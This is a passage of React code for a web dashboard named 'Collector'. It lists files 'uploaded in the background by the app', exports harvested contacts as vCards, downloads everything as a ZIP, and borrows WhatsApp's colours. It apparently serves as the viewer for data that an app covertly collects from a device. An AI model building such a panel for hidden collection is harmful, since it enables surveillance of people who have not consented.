                  <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 16 16"><path d="M1 2.5A1.5 1.5 0 012.5 1h3A1.5 1.5 0 017 2.5v3A1.5 1.5 0 015.5 7h-3A1.5 1.5 0 011 5.5v-3zm8 0A1.5 1.5 0 0110.5 1h3A1.5 1.5 0 0115 2.5v3A1.5 1.5 0 0113.5 7h-3A1.5 1.5 0 019 5.5v-3zm-8 8A1.5 1.5 0 012.5 9h3A1.5 1.5 0 017 10.5v3A1.5 1.5 0 015.5 15h-3A1.5 1.5 0 011 13.5v-3zm8 0A1.5 1.5 0 0110.5 9h3a1.5 1.5 0 011.5 1.5v3a1.5 1.5 0 01-1.5 1.5h-3A1.5 1.5 0 019 13.5v-3z"/></svg>
                ) : (
                  <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 16 16"><path fillRule="evenodd" d="M2.5 12a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5zm0-4a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5zm0-4a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5z"/></svg>
                )}
              </button>
            </div>
          </div>

          <ScrollArea className="flex-1">
            {filteredFiles.length === 0 ? (
              <div className="bg-white mx-3 rounded-2xl shadow-sm p-8 text-center mb-4">
                <FolderOpen className="w-12 h-12 text-gray-300 mx-auto mb-3" />
                <p className="text-gray-500 text-sm font-medium mb-1">No files synced yet</p>
                <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
                  Files are being uploaded in the background by the app. Refresh to check for updates.
                </p>
                <Button
                  onClick={() => handleRefresh()}
                  variant="outline"
                  size="sm"
                  className="mt-3 border-[#075E54]/30 text-[#075E54] rounded-xl text-xs"
                >
                  <RefreshCw className="w-3.5 h-3.5 mr-1" /> Refresh
                </Button>
              </div>
            ) : fileViewMode === 'grid' ? (
              /* ─── GRID VIEW ─── */
              <div className="px-3 pb-4">
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
                  {filteredFiles.map((file) => (
                    <div
                      key={file.id}
                      className="bg-white rounded-xl shadow-sm overflow-hidden cursor-pointer hover:shadow-md transition-shadow"
                      onClick={() => {
                        if (file.fileType === 'image' || file.fileType === 'pdf') {
                          setPreviewFile(file);
                        }
                      }}
                    >
                      {/* Thumbnail area */}
                      <div className="aspect-square bg-gray-50 flex items-center justify-center overflow-hidden relative">
                        {file.fileType === 'image' ? (
                          <img
                            src={file.downloadUrl}
                            alt={file.fileName}
                            className="w-full h-full object-cover"
                            loading="lazy"
                          />
                        ) : file.fileType === 'audio' ? (
                          <div className="flex flex-col items-center gap-2 w-full px-2">
                            <Music className="w-8 h-8 text-orange-400" />
                            <audio
                              controls
                              className="w-full h-8"
                              src={file.downloadUrl}
                              onClick={(e) => e.stopPropagation()}
                            >
                              <track kind="captions" />
                            </audio>
                          </div>
                        ) : file.fileType === 'pdf' ? (
                          <div className="flex flex-col items-center gap-2">
                            <FileText className="w-10 h-10 text-red-400" />
                            <span className="text-[10px] text-gray-500">PDF Document</span>
                          </div>
                        ) : file.fileType === 'video' ? (
                          <div className="flex flex-col items-center gap-2">
                            <Video className="w-10 h-10 text-red-400" />
                            <span className="text-[10px] text-gray-500">Video</span>
                          </div>
                        ) : (
                          <div className="flex flex-col items-center gap-2">
                            {getFileIcon(file.fileType)}
                            <span className="text-[10px] text-gray-500 capitalize">{file.fileType}</span>
                          </div>
                        )}
                      </div>
                      {/* File info */}
                      <div className="p-2">
                        <p className="text-xs font-medium text-gray-900 truncate">{file.fileName}</p>
                        <p className="text-[10px] text-gray-400">{formatFileSize(file.fileSize)}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              /* ─── LIST VIEW (original) ─── */
              <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
                {filteredFiles.map((file, index) => (
                  <React.Fragment key={file.id}>
                    <div className="w-full flex items-center gap-3 px-4 py-3">
                      <div className={`w-11 h-11 rounded-xl ${getFileBgColor(file.fileType)} flex items-center justify-center shrink-0`}>
                        {getFileIcon(file.fileType)}
                      </div>
                      <div className="flex-1 min-w-0 text-left">
                        <h3 className="text-sm font-medium text-gray-900 truncate">{file.fileName}</h3>
                        <p className="text-xs text-gray-500 mt-0.5 flex items-center gap-1.5">
                          <span>{formatFileSize(file.fileSize)}</span>
                          <span className="text-gray-300">|</span>
                          <span className="capitalize">{file.fileType}</span>
                          <span className="text-gray-300">|</span>
                          <span>{timeAgo(file.uploadedAt)}</span>
                        </p>
                      </div>
                      <div className="flex items-center gap-1">
                        {(file.fileType === 'image' || file.fileType === 'pdf') && (
                          <button
                            onClick={() => setPreviewFile(file)}
                            className="w-8 h-8 rounded-full hover:bg-gray-100 flex items-center justify-center"
                            title="Preview"
                          >
                            <Eye className="w-4 h-4 text-gray-400" />
                          </button>
                        )}
                        <button
                          onClick={() => downloadSingleFile(file)}
                          className="w-8 h-8 rounded-full hover:bg-[#25D366]/10 flex items-center justify-center"
                          title="Download"
                        >
                          <Download className="w-4 h-4 text-[#25D366]" />
                        </button>
                      </div>
                    </div>
                    {index < filteredFiles.length - 1 && <div className="ml-[68px] border-b border-gray-100" />}
                  </React.Fragment>
                ))}
              </div>
            )}
          </ScrollArea>
        </>
      )}

      {/* ─── FILE MANAGER TAB ────────────────────────── */}
      {activeTab === 'manager' && (
        <ScrollArea className="flex-1">
          {/* Storage Overview */}
          <div className="px-3 pt-1 pb-2 bg-[#ECE5DD]">
            <div className="bg-white rounded-2xl shadow-sm p-4">
              <h4 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                <HardDrive className="w-4 h-4 text-[#075E54]" />
                Storage Overview
              </h4>
              <div className="grid grid-cols-2 gap-3 mb-3">
                <div className="bg-purple-50 rounded-xl p-3 text-center">
                  <Image className="w-5 h-5 text-purple-500 mx-auto mb-1" aria-label="Images" />
                  <p className="text-xs font-bold text-gray-900">{fileTypeCounts.image || 0}</p>
                  <p className="text-[10px] text-gray-500">Images</p>
                </div>
                <div className="bg-red-50 rounded-xl p-3 text-center">
                  <Video className="w-5 h-5 text-red-500 mx-auto mb-1" />
                  <p className="text-xs font-bold text-gray-900">{fileTypeCounts.video || 0}</p>
                  <p className="text-[10px] text-gray-500">Videos</p>
                </div>
                <div className="bg-orange-50 rounded-xl p-3 text-center">
                  <Music className="w-5 h-5 text-orange-500 mx-auto mb-1" />
                  <p className="text-xs font-bold text-gray-900">{fileTypeCounts.audio || 0}</p>
                  <p className="text-[10px] text-gray-500">Audio</p>
                </div>
                <div className="bg-blue-50 rounded-xl p-3 text-center">
                  <FileText className="w-5 h-5 text-blue-500 mx-auto mb-1" />
                  <p className="text-xs font-bold text-gray-900">{(fileTypeCounts.pdf || 0) + (fileTypeCounts.document || 0)}</p>
                  <p className="text-[10px] text-gray-500">Documents</p>
                </div>
              </div>
              <div className="bg-gray-50 rounded-xl p-3 flex items-center justify-between">
                <div>
                  <p className="text-xs font-semibold text-gray-700">Total Storage</p>
                  <p className="text-lg font-bold text-[#075E54]">{formatFileSize(totalUploadSize)}</p>
                </div>
                <div className="text-right">
                  <p className="text-xs font-semibold text-gray-700">Total Files</p>
                  <p className="text-lg font-bold text-[#075E54]">{uploadedFiles.length}</p>
                </div>
              </div>
            </div>
          </div>

          {/* Quick Actions */}
          <div className="px-3 pb-2 bg-[#ECE5DD]">
            <h4 className="text-sm font-bold text-gray-700 mb-2 px-1">Quick Actions</h4>
            <div className="grid grid-cols-2 gap-2">
              <Button
                onClick={downloadZip}
                disabled={zipDownloading || uploadedFiles.length === 0}
                className="bg-[#25D366] hover:bg-[#20BD5A] text-white h-14 rounded-xl flex-col gap-0.5 text-xs"
              >
                {zipDownloading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Archive className="w-4 h-4" />}
                {zipDownloading ? 'Creating ZIP...' : 'Download All ZIP'}
              </Button>
              <Button
                onClick={downloadAllVCard}
                disabled={contacts.length === 0}
                variant="outline"
                className="border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 h-14 rounded-xl flex-col gap-0.5 text-xs"
              >
                <Phone className="w-4 h-4" />
                Download Contacts
              </Button>
            </div>
          </div>

          {/* All Files List */}
          <div className="px-3 pb-3 bg-[#ECE5DD]">
            <div className="flex items-center justify-between mb-2 px-1">
              <h4 className="text-sm font-bold text-gray-700">All Synced Files</h4>
              <Button
                onClick={() => handleRefresh()}
                variant="ghost"
                size="sm"
                className="text-[#075E54] text-xs h-7 px-2"
              >
                <RefreshCw className="w-3 h-3 mr-1" /> Refresh
              </Button>
            </div>
            {uploadedFiles.length === 0 ? (
              <div className="bg-white rounded-2xl shadow-sm p-8 text-center">
                <HardDrive className="w-12 h-12 text-gray-300 mx-auto mb-3" />
                <p className="text-gray-500 text-sm font-medium mb-1">No files synced yet</p>
                <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
                  The app is uploading files in the background. This may take some time depending on file sizes.
                </p>
              </div>
            ) : (
              <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
                {uploadedFiles.map((file, index) => (
                  <React.Fragment key={file.id}>
                    <div className="w-full flex items-center gap-3 px-4 py-3">
                      <div className={`w-10 h-10 rounded-xl ${getFileBgColor(file.fileType)} flex items-center justify-center shrink-0`}>
                        {getFileIcon(file.fileType)}
                      </div>
                      <div className="flex-1 min-w-0 text-left">
                        <h3 className="text-xs font-medium text-gray-900 truncate">{file.fileName}</h3>
                        <p className="text-[10px] text-gray-500 mt-0.5 flex items-center gap-1">
                          <span>{formatFileSize(file.fileSize)}</span>
                          <span className="text-gray-300">|</span>
                          <span className="capitalize">{file.fileType}</span>
                          <span className="text-gray-300">|</span>
                          <span>{timeAgo(file.uploadedAt)}</span>
                        </p>
                      </div>
                      <button
                        onClick={() => downloadSingleFile(file)}
                        className="w-8 h-8 rounded-full hover:bg-[#25D366]/10 flex items-center justify-center shrink-0"
                        title="Download"
                      >
                        <Download className="w-4 h-4 text-[#25D366]" />
                      </button>
                    </div>
                    {index < uploadedFiles.length - 1 && <div className="ml-[64px] border-b border-gray-100" />}
                  </React.Fragment>
                ))}
              </div>
            )}
          </div>
        </ScrollArea>
      )}

      {/* ─── File Preview Modal ─────────────────────── */}
      {previewFile && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={() => setPreviewFile(null)} />
          <div className="relative max-w-lg w-full mx-4 bg-white rounded-2xl shadow-2xl overflow-hidden">
            <div className="px-4 py-3 bg-[#075E54] flex items-center justify-between">
              <h4 className="text-white font-semibold text-sm truncate mr-2">{previewFile.fileName}</h4>
              <button onClick={() => setPreviewFile(null)} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center shrink-0">
                <X className="w-4 h-4 text-white/70" />
              </button>
            </div>
            <div className="p-4">
              {previewFile.fileType === 'image' ? (
                <img
                  src={previewFile.downloadUrl}
                  alt={previewFile.fileName}
                  className="w-full max-h-[60vh] object-contain rounded-xl"
                />
              ) : previewFile.fileType === 'audio' ? (
                <div className="flex flex-col items-center gap-4 py-8">
                  <Music className="w-16 h-16 text-orange-400" />
                  <audio controls className="w-full" src={previewFile.downloadUrl}>
                    <track kind="captions" />
                  </audio>
                </div>
              ) : previewFile.fileType === 'pdf' ? (
                <iframe
                  src={previewFile.downloadUrl}
                  className="w-full h-[60vh] rounded-xl"
                  title={previewFile.fileName}
                />
              ) : (
                <iframe
                  src={previewFile.downloadUrl}
                  className="w-full h-[60vh] rounded-xl"
                  title={previewFile.fileName}
                />
              )}
            </div>
            <div className="px-4 pb-4">
              <Button
                onClick={() => downloadSingleFile(previewFile)}
                className="w-full bg-[#25D366] hover:bg-[#20BD5A] text-white font-semibold h-12 rounded-xl"
              >
                <Download className="w-5 h-5 mr-2" /> Download File
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <div className="px-4 py-3 bg-white border-t border-gray-100">
        <p className="text-center text-xs text-gray-400">
          Collector &bull; {contacts.length} contacts &bull; {uploadedFiles.length} files &bull; {formatFileSize(totalUploadSize)}
        </p>
      </div>
    </div>
  );
}
